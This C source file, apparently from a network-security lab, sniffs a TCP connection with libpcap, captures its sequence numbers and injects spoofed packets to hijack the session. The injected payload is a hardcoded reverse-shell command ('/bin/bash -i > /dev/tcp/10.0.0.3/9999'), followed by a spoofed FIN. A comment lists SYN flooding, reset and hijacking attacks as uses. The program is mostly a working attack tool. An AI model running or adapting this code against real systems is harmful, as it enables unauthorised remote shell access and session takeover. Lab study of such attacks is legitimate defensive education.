#include <pcap.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include "PacketHeader.h"
void sendTCPPacket();
void print_hex_ascii_line(const u_char *payload, int len, int offset)
{

    int i;
    int gap;
    const u_char *ch;

    /* offset */
    printf("%05d   ", offset);

    /* hex */
    ch = payload;
    for (i = 0; i < len; i++)
    {
        printf("%02x ", *ch);
        ch++;
        /* print extra space after 8th byte for visual aid */
        if (i == 7)
            printf(" ");
    }
    /* print space to handle line less than 8 bytes */
    if (len < 8)
        printf(" ");

    /* fill hex gap with spaces if not full line */
    if (len < 16)
    {
        gap = 16 - len;
        for (i = 0; i < gap; i++)
        {
            printf("   ");
        }
    }
    printf("   ");

    /* ascii (if printable) */
    ch = payload;
    for (i = 0; i < len; i++)
    {
        if (isprint(*ch))
            printf("%c", *ch);
        else
            printf(".");
        ch++;
    }

    printf("\n");

    return;
}

/*
 * print packet payload data (avoid printing binary data)
 */
void print_payload(const u_char *payload, int len)
{

    int len_rem = len;
    int line_width = 16; /* number of bytes per line */
    int line_len;
    int offset = 0; /* zero-based offset counter */
    const u_char *ch = payload;

    if (len <= 0)
        return;

    /* data fits on one line */
    if (len <= line_width)
    {
        print_hex_ascii_line(ch, len, offset);
        return;
    }

    /* data spans multiple lines */
    for (;;)
    {
        /* compute current line length */
        line_len = line_width % len_rem;
        /* print line */
        print_hex_ascii_line(ch, line_len, offset);
        /* compute total remaining */
        len_rem = len_rem - line_len;
        /* shift pointer to remaining bytes to print */
        ch = ch + line_len;
        /* add offset */
        offset = offset + line_width;
        /* check if we have line width chars or less */
        if (len_rem <= line_width)
        {
            /* print last line and get out */
            print_hex_ascii_line(ch, len_rem, offset);
            break;
        }
    }

    return;
}

char SRC_IP[20];
char DEST_IP[20];
u_short SRC_PORT;
u_short DEST_PORT;
u_int SEQ_NUM;
u_int ACK_NUM;
// char TCP_DATA[100];
char TCP_DATA[100] = "\r /bin/bash -i > /dev/tcp/10.0.0.3/9999  0<&1 \r";

pcap_t *handle;
int flag = -1;
void got_packet(u_char *args, const struct pcap_pkthdr *header,
                const u_char *packet)
{
    const struct ethheader *eth = (struct ethheader *)packet;
    const struct ipheader *ip;   /* The IP header */
    const struct tcpheader *tcp; /* The TCP header */
    const char *payload;         /* Packet payload */

    int size_ip;
    int size_tcp;
    int size_payload;

    // printf("\nPacket number %d:\n", count);
    // count++;

    /* define/compute ip header offset */
    ip = (struct ipheader *)(packet + SIZE_ETHERNET);
    size_ip = IP_HL(ip) * 4;
    if (flag != -1)
    {
        return;
    }
    if (size_ip < 20)
    {
        printf("   * Invalid IP header length: %u bytes\n", size_ip);
        return;
    }

    if (ntohs(eth->ether_type) == 0x0800)
    { // 0x0800 is IP type
        struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));

        if (strcmp(inet_ntoa(ip->ip_src), SRC_IP) != 0 || strcmp(inet_ntoa(ip->ip_dst), DEST_IP) != 0)
        {
            return;
        }
        /* print source and destination IP addresses */
        printf("       From: %s\n", inet_ntoa(ip->ip_src));
        printf("         To: %s\n", inet_ntoa(ip->ip_dst));

        /* determine protocol */
        /* determine protocol */
        switch (ip->ip_p)
        {
        case IPPROTO_TCP:
            printf("   Protocol: TCP\n");
            break;
        case IPPROTO_UDP:
            printf("   Protocol: UDP\n");
            return;
        case IPPROTO_ICMP:
            printf("   Protocol: ICMP\n");
            return;
        case IPPROTO_IP:
            printf("   Protocol: IP\n");
            return;
        default:
            printf("   Protocol: unknown\n");
            return;
        }
        /* define/compute tcp header offset */
        tcp = (struct tcpheader *)(packet + SIZE_ETHERNET + size_ip);
        size_tcp = TH_OFF(tcp) * 4;
        if (size_tcp < 20)
        {
            printf("   * Invalid TCP header length: %u bytes\n", size_tcp);
            return;
        }

        SRC_PORT = ntohs(tcp->tcp_sport);
        DEST_PORT = ntohs(tcp->tcp_dport);
        SEQ_NUM = ntohl(tcp->tcp_seq);
        ACK_NUM = ntohl(tcp->tcp_ack);
        printf("   Src port: %d\n", SRC_PORT);
        printf("   Dst port: %d\n", DEST_PORT);
        printf("   Seq Number : %u\n", SEQ_NUM);
        printf("   Ack Number: %u\n", ACK_NUM);

        /* define/compute tcp payload (segment) offset */
        payload = (u_char *)(packet + SIZE_ETHERNET + size_ip + size_tcp);

        /* compute tcp payload (segment) size */
        size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);

        /*
	 * Print payload data; it might be binary, so don't just
	 * treat it as a string.
	 */
        if (size_payload > 0)
        {
            printf("   Payload (%d bytes):\n", size_payload);
            print_payload(payload, size_payload);
        }
        SEQ_NUM += size_payload;
        flag = 1;

        pcap_breakloop(handle);
    }
}

int main(int argc, char **argv)
{
    char errbuf[PCAP_ERRBUF_SIZE];
    struct bpf_program fp;
    char filter_exp[] = "tcp";
    bpf_u_int32 net;
    strcpy(SRC_IP, argv[1]);
    strcpy(DEST_IP, argv[2]);
    // strcpy(TCP_DATA, argv[4]);
    // Step 1: Open live pcap session on NIC with name enp0s3
    handle = pcap_open_live(argv[3], BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "Couldn't open device  %s\n", errbuf);
        return (2);
    }
    // Step 2: Compile filter_exp into BPF psuedo-code
    pcap_compile(handle, &fp, filter_exp, 0, net);
    pcap_setfilter(handle, &fp);

    // Step 3: Capture packets
    pcap_loop(handle, -1, got_packet, NULL);

    pcap_close(handle); //Close the handle
    sendTCPPacket();

    return 0;
}

unsigned short calculate_tcp_checksum(struct ipheader2 *ip);
void send_raw_ip_packet(struct ipheader2 *ip);

/******************************************************************
  Spoof a TCP packet. Can be used for the following attacks: 
              --- TCP SYN Flooding Attack
              --- TCP Reset Attack
              --- TCP Session Hijacking Attack
*******************************************************************/


struct ipheader2 *constructTCPpacket(char *src_ip, char* dst_ip,u_short sport,u_short dport,u_int seq_num, u_int ack_num, char *msg, int isFin)
{
    char buffer[2000];

    memset(buffer, 0, 2000);

    struct ipheader2 *ip = (struct ipheader2 *)buffer;
    struct tcpheader *tcp = (struct tcpheader *)(buffer + sizeof(struct ipheader2));

    /*********************************************************
      Step 1: Fill in the TCP data field.
    ********************************************************/
    char *data = buffer + sizeof(struct ipheader2) + sizeof(struct tcpheader);
    int data_len = strlen(msg);
    strncpy(data, msg, data_len);

    /*********************************************************
      Step 2: Fill in the TCP header.
    ********************************************************/
    tcp->tcp_sport = htons(sport);
    tcp->tcp_dport = htons(dport);
    tcp->tcp_seq = htonl(seq_num);
    tcp->tcp_ack = htonl(ack_num);
    tcp->tcp_offx2 = 0x50;
    tcp->tcp_flags = 0x018;
    if(isFin == 1)
        tcp->tcp_flags |= TH_FIN;
    tcp->tcp_win = htons(2000);
    tcp->tcp_sum = 0;

    /*********************************************************
      Step 3: Fill in the IP header.
    ********************************************************/
    ip->iph_ver = 4;  // Version (IPV4)
    ip->iph_ihl = 5;  // Header length
    ip->iph_ttl = 20; // Time to live
    //  ip->iph_sourceip.s_addr = rand(); // Use a random IP address
    printf("%s %s\n", src_ip, dst_ip);

    ip->iph_sourceip.s_addr = inet_addr(src_ip); // Source IP
    ip->iph_destip.s_addr = inet_addr(dst_ip);  // Dest IP
    ip->iph_protocol = IPPROTO_TCP;              // The value is 6.
    ip->iph_len = htons(sizeof(struct ipheader2) + sizeof(struct tcpheader) + data_len);

    // Calculate tcp checksum here, as the checksum includes some part of the IP header
    tcp->tcp_sum = calculate_tcp_checksum(ip);

    // No need to fill in the following fileds, as they will be set by the system.
    // ip->iph_chksum = ...

    return ip;
}


void sendTCPPacket()
{
    struct ipheader2 *ip = constructTCPpacket(SRC_IP, DEST_IP, SRC_PORT, DEST_PORT, SEQ_NUM, ACK_NUM, TCP_DATA, 0 );

    /*********************************************************
      Step 4: Finally, send the spoofed packet
    ********************************************************/
    send_raw_ip_packet(ip);
    struct ipheader2 *ip2 = constructTCPpacket(DEST_IP, SRC_IP , DEST_PORT, SRC_PORT,  ACK_NUM, SEQ_NUM,  "", 1  );

    send_raw_ip_packet(ip2);
}

